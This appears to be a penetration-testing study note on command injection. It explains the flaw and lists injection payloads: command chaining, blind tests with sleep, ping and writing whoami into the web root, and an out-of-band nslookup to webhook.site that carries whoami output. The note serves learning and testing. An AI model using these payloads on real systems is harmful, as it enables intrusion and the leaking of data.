# Command Injection

### Command Injection - Introduction

eval() is evil

User input is executed by a function

Never trust user input! Avoid using eval() (JS) and system() (PHP)

### Command Injection - Basics

Wiki https://appsecexplained.gitbook.io

Check paths for binaries with `which`

For reverse shells try to use the language the app is running

Basic command chaining

`; ls -la`

Using logic operators

`&& ls -la`

Commenting out the rest of a command

`; ls -la #`

Using a pipe for command chaining

`| ls -la`

Testing for blind injection

```
; sleep 10
; ping -c 10 127.0.0.1
& whoami > /var/www/html/whoami.txt &
```

Out-of-band testing

```
& nslookup webhook.site/<id>?`whoami` &
```

### Commmand Injection - Blind/Out-of-Band


